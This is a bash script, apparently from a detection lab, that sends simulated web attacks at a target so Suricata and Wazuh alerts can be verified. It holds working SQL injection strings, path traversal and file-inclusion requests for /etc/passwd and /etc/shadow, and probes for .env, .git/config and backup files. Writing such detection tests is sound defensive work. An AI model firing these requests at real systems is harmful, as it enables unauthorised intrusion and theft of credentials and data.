#!/bin/bash
# Scenario 2 - Web attacks               MITRE ATT&CK: T1190, T1595.002
# Expect: Suricata sids 1000003-1000005 -> Wazuh rules 100103, 100104
#         plus stock Wazuh web rules (31103 SQL injection, 31104 common web attack)
source /attacks/common.sh

banner "02 Web: scanner user-agent, SQL injection, path traversal, forced browsing"
req() { curl -s -o /dev/null -w "         %{http_code}  $2\n" --path-as-is -A "${3:-Mozilla/5.0}" "http://$TARGET$1"; }

req "/"                                              "scanner fingerprint (Nikto UA)" "Mozilla/5.00 (Nikto/2.5.0)"
req "/products.php?id=1'+OR+'1'='1"                  "SQLi: boolean OR"
req "/products.php?id=1+UNION+SELECT+user,password+FROM+users" "SQLi: UNION SELECT"
req "/search?q=1;SELECT+sleep(5)"                    "SQLi: time based"
req "/../../../../etc/passwd"                        "path traversal"
req "/static/..%2f..%2f..%2fetc%2fshadow"            "path traversal (encoded)"
req "/index.php?page=../../../../etc/passwd"         "local file inclusion"

info "forced browsing for admin panels and backups"
for p in admin wp-login.php phpmyadmin .git/config .env backup.zip server-status config.php.bak; do
  req "/$p" "GET /$p" "gobuster/3.6"
done
